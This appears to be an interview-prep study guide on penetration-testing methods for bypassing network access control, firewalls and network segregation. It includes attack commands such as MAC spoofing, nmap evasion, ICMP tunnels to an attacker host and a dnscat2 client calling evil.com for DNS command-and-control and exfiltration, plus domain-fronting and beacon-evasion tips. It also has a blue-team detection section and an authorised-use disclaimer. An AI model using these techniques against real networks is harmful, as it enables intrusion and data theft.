---
tags: [vapt, methodology, network-security, interview, master-guide]
difficulty: expert
module: "Ultimate VAPT Master Guides - Network"
topic: "Master Guide - Network VAPT 04"
---

# Master Guide: Bypassing Firewalls, NAC, and Network Segregation

## 1. Interview Strategy: How to Explain Bypasses
When an interviewer asks how to deal with a highly secured, segregated network, they want to see if you understand network architecture fundamentally. Novices give up when Nmap says "Filtered" or when they plug into an Ethernet jack and get no IP. 
An expert breaks the methodology into three logical hurdles:
1.  **Network Access Control (NAC):** How do you physically/logically get on the network? (802.1X, MAC filtering).
2.  **Firewalls/IDS/IPS:** How do you obscure your traffic to scan and communicate without being blocked? (Fragmentation, source routing, decoys).
3.  **Network Segregation:** How do you traverse VLANs, jump DMZs, or exfiltrate data from heavily isolated subnets? (Tunneling, C2 over DNS/ICMP).

*Key Interview Phrase:* "Security controls rely on parsing stateful rules and authenticating specific identifiers. My methodology for bypassing them is to either mimic trusted identifiers—such as cloning MAC addresses and certificates for NAC—or to encapsulate malicious traffic inside universally trusted protocols, like DNS or ICMP, to bypass stateless firewall rules and strict egress segregation."

---

## 2. Bypassing Network Access Control (NAC)

NAC ensures only authorized devices (laptops, phones) can communicate on a switch port or Wi-Fi network.

### MAC Address Spoofing (Basic NAC)
**The Flaw:** Basic NAC setups simply check a whitelist of allowed MAC addresses.
**The Bypass:** If you find a VoIP phone, printer, or user's computer, unplug it, read its MAC address, and spoof it on your machine.
- *Command:* `sudo macchanger -m AA:BB:CC:DD:EE:FF eth0`
- *Interview Tip:* Mention that VoIP phones are goldmines. Many networks automatically place MACs starting with specific OUI prefixes (like Cisco or Polycom) into a less-restricted Voice VLAN. Spoof a VoIP MAC to instantly hop into the Voice VLAN.

### Bypassing 802.1X (Advanced NAC)
**The Flaw:** 802.1X requires a cryptographic certificate (EAP-TLS) or credentials (PEAP) to authenticate the port. You cannot simply spoof a MAC. However, switches must allow EAPOL (EAP over LAN) traffic, and often fail to authenticate continuous data once the session is established.
**The Bypass: The Transparent Bridge (Fenrir/NAC Bypass)**
1. Connect an attacker device (like a Raspberry Pi) *between* the victim's authorized computer and the wall jack.
2. The attacker device acts as a transparent Layer 2 bridge.
3. The victim's computer authenticates to the switch via 802.1X. The switch opens the port.
4. The attacker device injects its own traffic into the established, authenticated stream using the victim's MAC address.
- *Tools:* `fenrir`, `nac_bypass_setup.sh`, hardware like Hak5 Turtle or custom Pi setups.

### EAP-MD5 Downgrade Attacks
If the NAC uses legacy EAP-MD5, the hashes are sent over the wire and can be cracked.
- *Tools:* `eapmd5pass`, capture with Wireshark, crack with `Hashcat`.

---

## 3. Bypassing Firewalls and IDS/IPS

Once on the network, firewalls control what IPs and ports you can talk to.

### Evasion via Packet Manipulation (Nmap)
Modern Next-Gen Firewalls (NGFW) track TCP states. However, older firewalls or misconfigured ACLs can be bypassed.
- **Fragmentation:** Break packets into tiny fragments. The IDS might not reassemble them correctly to inspect the payload, allowing the exploit to pass through.
  - *Command:* `nmap -f -f 10.10.10.5`
- **Decoys:** Hide your IP among dozens of spoofed IPs. The IDS logs 50 scans and cannot determine which is the real attacker.
  - *Command:* `nmap -D RND:20 10.10.10.5`
- **Source Port Manipulation:** Firewalls often blindly trust traffic originating from port 53 (DNS) or port 20 (FTP-Data) because of legacy stateful requirements.
  - *Command:* `nmap -g 53 10.10.10.5`

### Egress Busting (Finding the way out)
If you compromise a server in a DMZ, you need a reverse shell. But outbound rules are strict. How do you find which outbound ports are allowed?
- **The Attack:** Use a tool that attempts an outbound connection on all 65,535 ports simultaneously to an attacker-controlled server listening on all ports.
- *Tools:* `egressbuster`, `LetMeOut`.
- *Example:* The firewall blocks outbound 4444, but allows TCP 123 (NTP) outbound. You catch your reverse shell on port 123.

### Port Knocking
Some services are hidden by the firewall until a specific sequence of packets (the "knock") is received.
- *Bypass:* Analyze packet captures or server configurations to discover the sequence, then use `knock` utility to open the port.
  - *Command:* `knock target_ip 7000 8000 9000`

---

## 4. Bypassing Network Segregation (Tunneling & C2)

Air-gapped networks, strictly segregated PCI environments, and DMZs block standard TCP/UDP routing. We must encapsulate traffic.

### ICMP Tunneling
**The Flaw:** ICMP (Ping) is often allowed to traverse firewalls for troubleshooting. ICMP echo requests/replies carry a "data payload" section.
**The Bypass:** Encapsulate a full TCP/IP connection inside ICMP ping packets.
- *Tools:* `ptunnel`, `icmptunnel`.
- *Command (Attacker server):* `sudo ptunnel -x secretpassword`
- *Command (Compromised host):* `sudo ptunnel -p attacker_ip -lp 8000 -da internal_target -dp 22 -x secretpassword`
- *Impact:* You can SSH into an internal machine using only Ping packets.

### DNS Tunneling
**The Flaw:** Even highly secure environments allow internal DNS servers to resolve external domains recursively.
**The Bypass:** Set up a malicious domain (e.g., `evil.com`). Set your attacker server as the Authoritative Name Server. The compromised internal machine encodes data (like commands or exfiltrated files) into subdomains (e.g., `whoami.evil.com`). The firewall allows the DNS request out, and the DNS response contains the C2 command.
- *Tools:* `Iodine`, `dnscat2`, `Cobalt Strike` (DNS Beacon).
- *Dnscat2 Execution:* `dnscat2-client --dns domain=evil.com`

### Protocol Smuggling / Domain Fronting
**The Flaw:** Firewalls inspect HTTP Host headers or SNI (Server Name Indication) in TLS to block bad domains.
**The Bypass:** Connect to a highly trusted CDN (like Cloudflare or AWS CloudFront) using a legitimate SNI (e.g., `ajax.microsoft.com`), but inside the encrypted HTTP tunnel, request the Host header of your attacker C2 server hosted on the same CDN.
- *Impact:* The firewall only sees a trusted connection to Microsoft, but the CDN routes the traffic to the attacker.

---

## ASCII Diagram: 802.1X Transparent Bridge Bypass

```text
               +-------------------+
               | Corporate Switch  |
               | (802.1X Enabled)  |
               +---------+---------+
                         |
           (Port secured, awaits EAP-TLS)
                         |
                 +-------+-------+
                 | Attacker Hub /|   <-- "Transparent Bridge" (Raspberry Pi)
                 | Tap Device    |   <-- Silently copies MAC of Victim
                 +-------+-------+   <-- Injects attacker traffic using Victim's session
                         |
                         |
                 +-------+-------+
                 | Legitimate PC |
                 | (Has Valid    |   <-- Authenticates to switch via 802.1X
                 | Certificate)  |
                 +---------------+
```

---

## 5. Real-World Attack Scenario

**Scenario: Escaping the PCI-DSS Cardholder Data Environment (CDE)**
1. **Initial Access:** The pentester compromises a web server in the DMZ via an unauthenticated RCE vulnerability in an Apache Struts application.
2. **The Block:** The web server is isolated. It cannot route to the internal corporate network, and its outbound firewall rules drop all traffic except DNS (UDP 53) and TCP 443 (only to Windows Update servers). Standard reverse shells fail.
3. **The Pivot:** The tester deploys `dnscat2` via the web shell. The tool encapsulates a command-and-control shell inside DNS TXT queries. The queries are sent to the local internal DNS server, which recursively forwards them to the internet, bypassing the outbound firewall restrictions completely.
4. **Data Exfiltration:** Using the DNS tunnel, the tester slowly exfiltrates database configuration files.
5. **Internal Segregation Bypass:** The tester notices the server is allowed to ping (ICMP) a backend database server in the highly restricted PCI-DSS network. They deploy `ptunnel` and map a local port over ICMP to the backend database's port 1433, establishing a direct database connection via ping packets.

---

## 6. Chaining Opportunities

- **NAC Bypass -> DHCP Starvation:** Once you bypass 802.1X using a transparent bridge, you are on the network. You can immediately launch a rogue DHCP server to MitM the legitimate user you are bridged with.
- **Egress Busting -> SSH Reverse Tunneling:** Find an open outbound port (e.g., TCP 123), establish an SSH connection to your attacker server, and set up a reverse port forward (`ssh -R`) to expose the internal network to your attacker machine.
- **Protocol Smuggling -> Malware Deployment:** Use Domain Fronting to download your secondary stage payloads (like Cobalt Strike beacons) past Next-Gen Firewalls that block malicious domains via SSL decryption/SNI inspection.

---

## 7. Related Notes

- [[Network VAPT 02 - Exploiting Layer 2 and Layer 3 Vulnerabilities]] - NAC bypasses rely heavily on Layer 2 manipulation (MAC spoofing, bridge mechanics).
- [[Network VAPT 05 - Pivoting and Lateral Movement Methodologies]] - DNS and ICMP tunnels are advanced forms of pivoting. Proceed to guide 05 to master standard proxychain pivoting.
- [[Evasion and Obfuscation Master Guide]] - Further reading on bypassing Host-Based Intrusion Detection Systems (HIDS) and EDR platforms.

---
**Disclaimer:** Bypassing security controls like NAC and Next-Gen Firewalls is an advanced technique intended for authorized Red Team operations and advanced VAPT engagements. Unauthorized implementation of transparent bridges or C2 tunnels is strictly prohibited.

---

## 8. Deep Dive: Advanced Egress Testing and C2 Obfuscation
When dealing with Next-Gen Firewalls (Palo Alto, Fortinet) and deep packet inspection (DPI), simple ICMP or DNS tunnels often fail.
- **TLS/SSL Decryption Evasion:** NGFWs often act as a MiTM, decrypting outbound TLS traffic to inspect the payload. To bypass this, attackers use **Domain Fronting** or **Jitter**.
- **Jitter and Beaconing:** C2 frameworks like Cobalt Strike or Sliver use "beacons" that check in periodically. If a beacon checks in exactly every 60 seconds, the firewall detects the robotic pattern. "Jitter" adds a random percentage (e.g., 20%) to the sleep time, making the traffic look like a human browsing a website.
- **Malleable C2 Profiles:** You can customize your traffic to look exactly like Amazon AWS API calls, Google Analytics, or jQuery updates. The firewall inspects the HTTP headers, sees perfectly formatted Google Analytics traffic, and allows it through.
- **Egress Port Analysis:** `LetMeOut` or `egressbuster` are crucial. By testing all 65,535 outbound ports, you might find that while TCP 80/443 are heavily inspected, UDP port 500 (IPsec) or TCP port 5228 (Android Push Notifications) are allowed straight out to the internet without inspection.

## 9. Comprehensive Tool Reference Matrix
| Tool | Layer / Mechanism | Primary Use Case | Evasion Technique |
|------|-------------------|------------------|-------------------|
| macchanger | Layer 2 | Spoofing MAC addresses to bypass basic port security or NAC whitelists. | Mimicry |
| fenrir | Layer 2 / 802.1X | Transparent bridge to inject traffic into an authenticated 802.1X session. | Session Hijacking |
| ptunnel-ng | Layer 3 (ICMP) | Tunneling TCP connections through ICMP Echo Request/Reply packets. | Protocol Encapsulation |
| dnscat2 | Layer 7 (DNS) | Command and Control over DNS TXT, CNAME, or MX records. | Recursive DNS abuse |
| Iodine | Layer 7 (DNS) | Creates a full IPv4 interface tunneled over DNS. | Recursive DNS abuse |
| Nmap (Evade) | Network (TCP/IP) | Using `-f` (fragmentation), `-D` (decoys), or `--mtu` to bypass stateless IDS. | Packet Manipulation |
| Cobalt Strike | Layer 7 (HTTP/S) | Malleable C2 profiles to blend malicious traffic with legitimate web traffic. | Traffic Shaping |

## 10. Blue Team: Detection Engineering for Bypasses
- **Detecting MAC Spoofing/NAC Bypass:** Defenders use NAC solutions like Cisco ISE that profile the device. Even if the MAC matches a printer, if the network traffic shows an Nmap scan or a Windows User-Agent string coming from that MAC, the switch port is immediately shut down.
- **Detecting DNS Tunnels:** DNS tunnels generate massive amounts of DNS traffic. Defenders alert on:
  - Unusually long subdomains (`base64string.evil.com`).
  - High volume of TXT record queries (which are rarely used in such volume normally).
  - High entropy in the DNS query strings.
- **Detecting ICMP Tunnels:** A normal ping packet has a small, static payload. ICMP tunnels have large, highly variable payloads. SIEMs alert on ICMP packets exceeding a specific byte size or containing high-entropy data.

## 11. Common Interview Pitfalls and How to Avoid Them
1.  **"I'll just spoof my MAC to bypass 802.1X"**: 802.1X requires a cryptographic certificate or credentials. A spoofed MAC alone will still be blocked by the switch port. You must mention a transparent bridge or hub attack to bypass 802.1X.
2.  **Assuming Firewalls block ALL outbound traffic**: Firewalls rarely block everything. If they did, servers couldn't update or resolve domains. Always explain your methodology for finding the allowed outbound ports (DNS, NTP, HTTP).
3.  **Misunderstanding DNS Tunneling**: A common mistake is thinking the compromised host needs to talk directly to the attacker's DNS server. It does not. It talks to the *internal* corporate DNS server, which recursively forwards the request to the attacker. This is why it bypasses strict outbound firewalls.
4.  **Using noisy Nmap evasions**: Fragmentation (`-f`) often triggers modern firewalls instantly because heavily fragmented packets are anomalous. Mentioning custom packet crafting or slow, targeted scanning is a safer interview answer.
